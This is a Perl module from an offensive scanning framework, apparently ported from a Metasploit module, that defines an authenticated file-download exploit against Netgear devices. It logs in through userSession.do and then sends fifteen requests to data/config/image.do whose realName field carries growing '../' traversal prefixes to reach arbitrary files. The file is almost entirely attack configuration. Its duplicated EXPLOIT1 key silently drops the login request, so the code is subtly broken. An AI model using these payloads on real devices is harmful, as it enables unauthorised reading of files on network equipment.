package P1rK3r::Exploits::NETGEAR::MSF::NetgearAuthDownload;
use parent qw(P1rK3r::Exploit P1rK3r::Services::NETGEAR);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "NetgearAuthDownload";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'ALL',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'userSession.do',
                        PAYLOAD      => 'userName=__USERNAME__&password=__PASSWORD__',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /userSession.do',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=__INCLUSION__&md5=&fileName=97lqM5DzNlSEMkw.img&version=WNXc7Arr9&vendor=sXkX8&deviceType=170&deviceModel=3d6gmUQ&description=q4J3P1vOIby7',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT2 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=..__INCLUSION__&md5=&fileName=0uQ58RHfbh7TEZ77.img&version=T7Kdjhjt&vendor=GtdD&deviceType=850&deviceModel=XdNKdJl&description=WxfvTJV3jXc1uD',
                        TEXT         => 'Sending Exploit #2 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT3 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../..__INCLUSION__&md5=&fileName=iRJmyb26XgMRPL2X.img&version=UGyC1JIMR&vendor=tgROB7&deviceType=974&deviceModel=amwMF3&description=l6Udtlmgr6IaN',
                        TEXT         => 'Sending Exploit #3 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT4 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../..__INCLUSION__&md5=&fileName=gbsRkz98J7GCg3pT.img&version=Gznqm5Hy5&vendor=e1wA&deviceType=211&deviceModel=gBWXi4&description=qfAmtciNMj5e',
                        TEXT         => 'Sending Exploit #4 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT5 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../..__INCLUSION__&md5=&fileName=jn2Q00ZXxkLJ.img&version=esSX0o8B&vendor=zIWF&deviceType=593&deviceModel=zK7vl&description=kgJrAdKkLpFN',
                        TEXT         => 'Sending Exploit #5 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT6 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../..__INCLUSION__&md5=&fileName=VsjvfnY0S0pfd781B.img&version=ZMuJcq1HM&vendor=j1Ug&deviceType=772&deviceModel=Js5gE&description=IgVxBQ3JIpj',
                        TEXT         => 'Sending Exploit #6 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT7 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../../..__INCLUSION__&md5=&fileName=uJAz9XZ2AK8OW5.img&version=7Ixb26hV&vendor=01Zi&deviceType=265&deviceModel=jY7ixo&description=F8kZ2ZxDYQ',
                        TEXT         => 'Sending Exploit #7 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT8 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../../../..__INCLUSION__&md5=&fileName=3jmLSsbtSJPBx.img&version=OWAZZSj61&vendor=De57&deviceType=295&deviceModel=UMXB8l&description=VI7gF3lQg',
                        TEXT         => 'Sending Exploit #8 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT9 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../../../../..__INCLUSION__&md5=&fileName=EAnKjiTtRgbqamp.img&version=1taG1r2SB&vendor=ZZ9e&deviceType=743&deviceModel=asolvK&description=VzP78sZUK',
                        TEXT         => 'Sending Exploit #9 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT10 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../../../../../..__INCLUSION__&md5=&fileName=CLU7znSmJFpmMomT.img&version=P8C8rkpB&vendor=dPGxv&deviceType=611&deviceModel=bLrZy0V&description=zgX5tgW4',
                        TEXT         => 'Sending Exploit #10 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT11 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../../../../../../..__INCLUSION__&md5=&fileName=bh5Il7myt2M.img&version=iXu7H1MuX&vendor=49w3J&deviceType=155&deviceModel=3uO3uOR&description=0monTr92he',
                        TEXT         => 'Sending Exploit #11 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT12 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../../../../../../../..__INCLUSION__&md5=&fileName=hOangUX83hAt9qh.img&version=yLqqoa22&vendor=E1ky1&deviceType=825&deviceModel=oQb3M1c&description=Db66xqsMsx4y',
                        TEXT         => 'Sending Exploit #12 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT13 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../../../../../../../../..__INCLUSION__&md5=&fileName=BulEjgCLRGuWx4GY1.img&version=Sfm2gVjf&vendor=YCeC1&deviceType=943&deviceModel=Vv4oSy&description=DnbmPKrcDsP5Ixsm',
                        TEXT         => 'Sending Exploit #13 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT14 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../../../../../../../../../..__INCLUSION__&md5=&fileName=zVE7etOa5esNp.img&version=4KBFZfn5&vendor=BunEi&deviceType=959&deviceModel=rmmoqrS&description=UUCOPmVTxjPIn',
                        TEXT         => 'Sending Exploit #14 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT15 => {
                        METHOD       => 'POST',
                        PATH         => 'data/config/image.do',
                        PAYLOAD      => 'realName=../../../../../../../../../../../../../..__INCLUSION__&md5=&fileName=ysfHJXwZCcfRx2cRN.img&version=xXzs53tNL&vendor=RllmS&deviceType=582&deviceModel=rSB7U&description=4hdVgNBB',
                        TEXT         => 'Sending Exploit #15 Request : [POST] /data/config/image.do',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
